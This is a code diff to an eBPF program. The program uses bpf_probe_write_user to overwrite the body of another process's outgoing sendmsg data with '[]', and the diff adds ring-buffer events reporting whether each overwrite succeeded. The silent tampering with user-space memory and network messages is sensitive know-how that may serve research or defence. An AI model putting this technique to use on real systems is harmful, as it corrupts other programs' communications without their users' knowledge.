@@ -5,6 +5,13 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_core_read.h>
 
+/* ringbuffer map to let userspace know when we've overwritten data */
+struct {
+    __uint(type, BPF_MAP_TYPE_RINGBUF);
+    __uint(max_entries, MAX_ENTRIES);
+} rb SEC(".maps");
+
+/* map holding iov_data struct to pass between tail calls */
 struct {
     __uint(type, BPF_MAP_TYPE_ARRAY);
     __uint(max_entries, MAX_ENTRIES);
@@ -12,6 +19,7 @@ struct {
     __type(value, struct iov_data);
 } iov_sendmsg_data_map SEC(".maps");
 
+/* map holding programs for tail calls */
 struct {
     __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
     __uint(max_entries, 33);
@@ -130,7 +138,17 @@ out:
     
     /* overwrite msg body with nothing ;) */
     static const char empty_body[] = "[]";
-    bpf_probe_write_user(data->body_start, &empty_body, sizeof(empty_body));
+    long ret = bpf_probe_write_user(data->body_start, &empty_body, sizeof(empty_body));
+
+    /* send event */
+    struct event *e;
+    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0); /* reserve the sizeof our event */
+    if (e) {
+        e->success = (ret == 0);
+        bpf_ringbuf_submit(e, 0);
+    }
+
+    //bpf_map_delete_elem(&iov_sendmsg_data_map, &pid_tgid);
     return 0;
 }
 
